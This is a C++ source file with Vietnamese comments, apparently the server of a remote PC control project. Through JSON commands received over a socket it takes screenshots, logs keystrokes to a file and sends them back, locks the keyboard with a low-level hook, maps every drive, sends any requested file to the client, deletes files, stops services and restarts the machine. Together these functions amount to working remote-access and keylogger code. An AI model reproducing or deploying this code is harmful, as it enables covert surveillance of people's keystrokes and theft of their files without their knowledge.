// Hàm chuyển đổi chuỗi nhị phân thành tệp BMP và lưu vào thư mục Downloads
bool saveBinaryToImage(const string& binaryData, const string& savePath) {
    // Mở tệp nhị phân để ghi dữ liệu vào tệp hình ảnh
    ofstream outFile(savePath, ios::out | ios::binary);
    if (!outFile) {
        cerr << "Error: Cannot open file to save!" << endl;
        return false;
    }

    // Ghi dữ liệu vào tệp
    outFile.write(binaryData.c_str(), binaryData.size());
    outFile.close();

    cout << "Image has been saved to the file: " << savePath << endl;
    return true;
}


string screenShot() {
    int screenWidth, screenHeight;

    // Chụp ảnh màn hình
    HBITMAP hBitmap = captureScreen(screenWidth, screenHeight);
    if (!hBitmap) {
        cout << "Failed to screenshot!";
        return "";
    }

    // Thư mục lưu ảnh chụp màn hình
    const string folderPath = "D:\\test screenshot server";

    string bmpFilePath = folderPath + "\\" + generateFileName();

    // Lưu ảnh chụp màn hình vào tệp BMP
    if (!saveHBitmapToBMP(hBitmap, screenWidth, screenHeight, folderPath)) {
        cout << "Failed to screenshot!" << endl;
        DeleteObject(hBitmap);
        return "";
    }

    // Giải phóng tài nguyên
    DeleteObject(hBitmap);

    return bmpFilePath;
}

// Key locking

// Hàm callback để chặn bàn phím
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        return 1; // Chặn tất cả các phím bấm
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

bool LockKeyboard() {
    if (keyboardHook != NULL) {
        cout << "Keyboard is already locked!" << endl;
        return false;
    }

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (keyboardHook == NULL) {
        DWORD error = GetLastError();
        cout << "Failed to lock the keyboard. Error code: " << error << endl;
        return false;
    }

    cout << "The keyboard has been locked." << endl;

    return true;
}


string solveKeyLockingAndSend(bool& flag) {
    json jsonResponse;

    jsonResponse["title"] = "keyLocking";

    if (LockKeyboard()) {
        jsonResponse["result"] = "Successfully locked the keyboard";
        flag = true;
    }
    else {
        jsonResponse["result"] = "Failed to lock the key";
    }

    return jsonResponse.dump();
}

void runKeyLockingLoop() {
    cout << "Message loop is running on Thread ID: " << GetCurrentThreadId() << endl;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    cout << "Message loop has ended." << endl;
}


// keyUnlocking

bool UnlockKeyboard() {
    if (keyboardHook == NULL) {
        cout << "Keyboard is not locked or already unlocked!" << endl;
        return false;
    }

    if (UnhookWindowsHookEx(keyboardHook)) {
        keyboardHook = NULL;
        cout << "The keyboard has been unlocked." << endl;
        return true;
    }
    else {
        DWORD error = GetLastError();
        cout << "Failed to unlock the keyboard. Error code: " << error << endl;
        return false;
    }
}

string solveKeyUnlockingAndSend(bool& flag) {
    json jsonResponse;

    jsonResponse["title"] = "keyUnlocking";

    if (UnlockKeyboard()) {
        jsonResponse["result"] = "Successfully unlocked the keyboard";
    }
    else {
        jsonResponse["result"] = "Failed to unlock the keyboard";
    }

    return jsonResponse.dump();
}


// Key logger

// Bảng ánh xạ mã phím sang tên phím
map<int, string> createKeyMap() {
    map<int, string> keyMap;

    // Các phím chữ cái
    for (char c = 'A'; c <= 'Z'; ++c) keyMap[c] = string(1, c);

    // Các phím số
    for (char c = '0'; c <= '9'; ++c) keyMap[c] = string(1, c);

    // Các phím chức năng
    keyMap[VK_F1] = "F1";    keyMap[VK_F2] = "F2";    keyMap[VK_F3] = "F3";
    keyMap[VK_F4] = "F4";    keyMap[VK_F5] = "F5";    keyMap[VK_F6] = "F6";
    keyMap[VK_F7] = "F7";    keyMap[VK_F8] = "F8";    keyMap[VK_F9] = "F9";
    keyMap[VK_F10] = "F10";  keyMap[VK_F11] = "F11";  keyMap[VK_F12] = "F12";

    // Các phím điều khiển
    keyMap[VK_SHIFT] = "Shift";
    keyMap[VK_CONTROL] = "Ctrl";
    keyMap[VK_MENU] = "Alt";
    keyMap[VK_SPACE] = "Space";
    keyMap[VK_RETURN] = "Enter";
    keyMap[VK_BACK] = "Backspace";
    keyMap[VK_TAB] = "Tab";
    keyMap[VK_ESCAPE] = "Esc";
    keyMap[VK_CAPITAL] = "Caps Lock";   // Caps Lock
    keyMap[VK_NUMLOCK] = "Num Lock";   // Num Lock
    keyMap[VK_LWIN] = "Left Windows";   // Left Windows Key
    keyMap[VK_RWIN] = "Right Windows";  // Right Windows Key

    // Các phím mũi tên
    keyMap[VK_LEFT] = "Left Arrow";
    keyMap[VK_RIGHT] = "Right Arrow";
    keyMap[VK_UP] = "Up Arrow";
    keyMap[VK_DOWN] = "Down Arrow";

    // Các phím đặc biệt khác
    keyMap[VK_DELETE] = "Delete";
    keyMap[VK_INSERT] = "Insert";
    keyMap[VK_HOME] = "Home";
    keyMap[VK_END] = "End";
    keyMap[VK_PRIOR] = "Page Up";
    keyMap[VK_NEXT] = "Page Down";

    // Các ký tự đặc biệt
    keyMap[0xBD] = "-"; keyMap[0xBB] = "="; keyMap[0xDB] = "["; keyMap[0xDD] = "]";
    keyMap[0xDC] = "\\"; keyMap[0xBA] = ";"; keyMap[0xDE] = "'"; keyMap[0xBC] = ",";
    keyMap[0xBE] = "."; keyMap[0xBF] = "/"; keyMap[0xC0] = "`";
    keyMap[0x30] = "0"; keyMap[0x31] = "1"; keyMap[0x32] = "2"; keyMap[0x33] = "3";
    keyMap[0x34] = "4"; keyMap[0x35] = "5"; keyMap[0x36] = "6"; keyMap[0x37] = "7";
    keyMap[0x38] = "8"; keyMap[0x39] = "9";

    // Các phím NumPad
    keyMap[VK_NUMPAD0] = "NumPad 0";
    keyMap[VK_NUMPAD1] = "NumPad 1";
    keyMap[VK_NUMPAD2] = "NumPad 2";
    keyMap[VK_NUMPAD3] = "NumPad 3";
    keyMap[VK_NUMPAD4] = "NumPad 4";
    keyMap[VK_NUMPAD5] = "NumPad 5";
    keyMap[VK_NUMPAD6] = "NumPad 6";
    keyMap[VK_NUMPAD7] = "NumPad 7";
    keyMap[VK_NUMPAD8] = "NumPad 8";
    keyMap[VK_NUMPAD9] = "NumPad 9";
    keyMap[VK_DECIMAL] = "NumPad .";
    keyMap[VK_DIVIDE] = "NumPad /";
    keyMap[VK_MULTIPLY] = "NumPad *";
    keyMap[VK_SUBTRACT] = "NumPad -";
    keyMap[VK_ADD] = "NumPad +";
    keyMap[VK_NUMLOCK] = "Num Lock";

    return keyMap;
}

vector<string> collectKeyNames(int durationInSeconds) {
    map<int, string> keyMap = createKeyMap(); // Tạo bảng ánh xạ mã phím
    vector<string> keyNames;  // Lưu trữ tên các phím đã nhấn
    bool keyState[256] = { false }; // Trạng thái trước đó của các phím

    auto startTime = GetTickCount64(); // Lấy thời gian bắt đầu (milliseconds)
    cout << "Started collecting keys (Duration: " << durationInSeconds << " seconds):" << endl;

    while ((GetTickCount64() - startTime) / 1000 < durationInSeconds) {
        for (int key = 0; key < 256; ++key) { // Duyệt qua tất cả các mã phím
            bool isPressed = GetAsyncKeyState(key) & 0x8000; // Kiểm tra nếu phím được nhấn

            // Kiểm tra trạng thái phím điều khiển
            if (key == VK_LBUTTON || key == VK_RBUTTON) continue;  // Bỏ qua phím chuột

            if (isPressed && !keyState[key]) { // Nếu phím vừa được nhấn (chưa nhấn trước đó)
                keyState[key] = true; // Cập nhật trạng thái

                if (keyMap.find(key) != keyMap.end()) { // Nếu mã phím có trong bảng ánh xạ
                    keyNames.push_back(keyMap[key]);
                    cout << "Key pressed: " << keyMap[key] << endl;  // "Phím được nhấn"
                }
            }
            else if (!isPressed) { // Nếu phím không còn nhấn
                keyState[key] = false; // Reset trạng thái
            }
        }
        Sleep(10); // Giảm tải CPU
    }
    return keyNames;

}

void writeKeyNamesToFile(vector<string>& keyNames) {
    ofstream output;
    output.open("keyLogger.txt");

    for (string& key : keyNames) {
        output << key << " ";
    }

    output.close();
}


string keyLogger(int durationInSeconds) {
    json jsonResponse;

    jsonResponse["title"] = "keyLogger";

    vector<string> keyNames = collectKeyNames(durationInSeconds);

    if (keyNames.size() == 0) {
        jsonResponse["result"] = "Failed to collect keys";
    }
    else {
        jsonResponse["result"] = "Key logger successfully";
        writeKeyNamesToFile(keyNames);
    }

    return jsonResponse.dump();
}

// Xử lí chức năng in ra cây thư mục

// Hàm kiểm tra xem tệp/thư mục có ẩn hoặc là hệ thống không
bool isHiddenOrSystem(const filesystem::path& path) {
    DWORD attributes = GetFileAttributesW(path.wstring().c_str());
    if (attributes == INVALID_FILE_ATTRIBUTES) return false;
    return (attributes & FILE_ATTRIBUTE_HIDDEN) || (attributes & FILE_ATTRIBUTE_SYSTEM);
}

// Hàm in cây thư mục ra tệp
void printDirectoryTree(const filesystem::path& path, std::wofstream& output, int indent = 0, int currentDepth = 0, int maxDepth = 3) {
    if (currentDepth > maxDepth) return; // Dừng nếu vượt quá mức tối đa

    try {
        for (const auto& entry : filesystem::directory_iterator(path)) {
            // Bỏ qua tệp/thư mục ẩn hoặc hệ thống
            if (isHiddenOrSystem(entry.path())) continue;

            // Chuẩn bị chuỗi đầu ra
            wstring line = wstring(indent, L' ') + L"|-- " + entry.path().filename().wstring() + L"\n";

            // Ghi vào tệp
            output << line;

            // Nếu là thư mục, tiếp tục đệ quy (nếu ở mức nhỏ hơn mức tối đa)
            if (filesystem::is_directory(entry.path()) && currentDepth < maxDepth) {
                printDirectoryTree(entry.path(), output, indent + 4, currentDepth + 1, maxDepth);
            }
        }
    }
    catch (const filesystem::filesystem_error& e) {
        output << L"Error: " << e.what() << L"\n";
    }
}

// Hàm liệt kê các ổ đĩa và in cây thư mục
bool listDrivesAndPrintTree() {
    // Cấu hình luồng ghi file với UTF-8
    wofstream output("DirectoryTree.txt", ios::out);
    output.imbue(locale("en_US.UTF-8"));

    if (!output.is_open()) {
        wcout << L"Error: Unable to open file DirectoryTree.txt for writing.\n";
        return false;
    }

    DWORD drives = GetLogicalDrives();
    if (drives == 0) {
        output << L"Error: Unable to retrieve the list of drives.\n";
        return false;
    }

    // Ghi tiêu đề vào tệp
    output << L"This PC\n";

    for (char drive = 'A'; drive <= 'Z'; ++drive) {
        if (drives & (1 << (drive - 'A'))) {
            // Tạo đường dẫn ổ đĩa
            wstring drivePath = wstring(1, drive) + L":\\";

            // Ghi vào tệp
            output << L"|-- Drive " + drivePath + L"\n";

            // In thư mục con cấp 2
            printDirectoryTree(drivePath, output, 4, 1, 3);
        }
    }

    output.close();
    return true;
}

string createDiractoryTree() {
    // Khai báo biến để lưu chế độ mặc định của stdout
    int defaultMode = _O_TEXT; // Đảm bảo biến được khởi tạo đúng giá trị mặc định

    // Lưu chế độ hiện tại của stdout
    defaultMode = _setmode(_fileno(stdout), _O_U16TEXT);
    if (defaultMode == -1) {
        cout << "Unable to switch output mode to Unicode. The program will continue with default settings.\n";
    }

    json jsonResponse;
    jsonResponse["title"] = "getDirectoryTree";

    // Liệt kê các ổ đĩa và ghi cây thư mục vào tệp
    if (listDrivesAndPrintTree()) {
        jsonResponse["result"] = "Successfully created directory tree";
    }
    else {
        jsonResponse["result"] = "Failed to create directory tree";
    }

    // Khôi phục chế độ ban đầu của stdout
    if (_setmode(_fileno(stdout), defaultMode) == -1) {
        cout << "Failed to restore default stdout mode.\n";
    }

    return jsonResponse.dump();
}

void processRequest(SOCKET& clientSocket, string jsonRequest) {
    // Tạo đối tượng JSON từ chuỗi JSON
    json Request = json::parse(jsonRequest);

    string jsonResponse = "";

    if (Request.contains("title")) {
        if (Request.at("title") == "listApps") {
            jsonResponse = listApps();
            sendFile(clientSocket, "AppList.txt");
            sendJSON(clientSocket, jsonResponse);
        }
        else if (Request.at("title") == "listServices") {
            jsonResponse = listServices();
            sendFile(clientSocket, "ServiceList.txt");
            sendJSON(clientSocket, jsonResponse);
        }
        else if (Request.at("title") == "listProcess") {
            jsonResponse = listServices();
            sendFile(clientSocket, "ProcessList.txt");
            sendJSON(clientSocket, jsonResponse);
        }
        else if (Request.at("title") == "startApp") {
            if (Request.contains("nameObject")) {
                jsonResponse = startApp(Request.at("nameObject"));
                sendJSON(clientSocket, jsonResponse);
            }
        }
        else if (Request.at("title") == "startService") {
            if (Request.contains("nameObject")) {
                jsonResponse = startService(Request.at("nameObject"));
                sendJSON(clientSocket, jsonResponse);
            }
        }
        else if (Request.at("title") == "stopApp") {
            if (Request.contains("nameObject")) {
                jsonResponse = stopApp(Request.at("nameObject"));
                sendJSON(clientSocket, jsonResponse);
            }
        }
        else if (Request.at("title") == "stopService") {
            if (Request.contains("nameObject")) {
                jsonResponse = stopService(Request.at("nameObject"));
                sendJSON(clientSocket, jsonResponse);
            }
        }
        else if (Request.at("title") == "restart") {
            json jsonResponse_temp;
            jsonResponse_temp["title"] = "restart";
            jsonResponse_temp["result"] = "Your computer will be restart in few seconds";

            sendJSON(clientSocket, jsonResponse_temp.dump());
            restart();
        }
        else if (Request.at("title") == "shutdown") {
            json jsonResponse_temp;
            jsonResponse_temp["title"] = "restart";
            jsonResponse_temp["result"] = "Your computer has been successfully shutdown";

            sendJSON(clientSocket, jsonResponse);
        }
       /* else if (Request.at("title") == "startWebcam") {
          
            jsonResponse = startWebcam(clientSocket);
            sendJSON(clientSocket, jsonResponse);
        }

        else if (Request.at("title") == "stopWebcam") {
            jsonResponse = stopWebcam(clientSocket);
            sendJSON(clientSocket, jsonResponse);
        }*/

        else if (Request.at("title") == "screenShot") {
            string filePath = screenShot();
            json temp;

            temp["title"] = "screenShot";

            if (sendFile(clientSocket, filePath)) {
                temp["result"] = "Successfully screenshot";
            }
            else {
                temp["result"] = "Failed to screenshot";
            }

            jsonResponse = temp.dump();
            sendJSON(clientSocket, jsonResponse);
        }

        else if (Request.at("title") == "sendFile") {
            json temp;

            string filePath = Request.at("nameObject");

            // get file name to send client
            size_t pos = filePath.rfind('\\');

            string fileName;
            if (pos != string::npos) {
                fileName = filePath.substr(pos + 1);
            }
            else {
                fileName = filePath;
            }

            temp["title"] = "sendFile";
            temp["fileName"] = fileName;

            if (sendFile(clientSocket, filePath)) {
                temp["result"] = "File copied and sent successfully";
            }
            else {
                temp["result"] = "Failed to copy file and send it";
            }

            jsonResponse = temp.dump();
            sendJSON(clientSocket, jsonResponse);
        }

        else if (Request.at("title") == "copyFile") {
            jsonResponse = copyFile(Request.at("source"), Request.at("destination"));
            sendJSON(clientSocket, jsonResponse);
        }

        else if (Request.at("title") == "deleteFile") {
            string filePath = Request.at("nameObject");

            jsonResponse = deleteFile(filePath);
            sendJSON(clientSocket, jsonResponse);
        }

        else if (Request.at("title") == "keyLogger") {
            string time = Request.at("nameObject");
            int duration = stoi(time);

            jsonResponse = keyLogger(duration);
            sendFile(clientSocket, "keyLogger.txt");
            sendJSON(clientSocket, jsonResponse);
        }

        else if (Request.at("title") == "keyLocking") {
            bool flag = false;
            jsonResponse = solveKeyLockingAndSend(flag);
            sendJSON(clientSocket, jsonResponse);

            if (flag) runKeyLockingLoop();
        }

        else if (Request.at("title") == "keyUnlocking") {
            bool flag;
            jsonResponse = solveKeyUnlockingAndSend(flag);
            sendJSON(clientSocket, jsonResponse);
        }

        else if (Request.at("title") == "getDirectoryTree") {
            jsonResponse = createDiractoryTree();
            sendFile(clientSocket, "DirectoryTree.txt");
            sendJSON(clientSocket, jsonResponse);
        }

        else {
            json temp;

            temp["title"] = "Error";
            temp["result"] = "Your request is invalid. Please review and resend it";

            jsonResponse = temp.dump();
            sendJSON(clientSocket, jsonResponse);
        }
    }
}
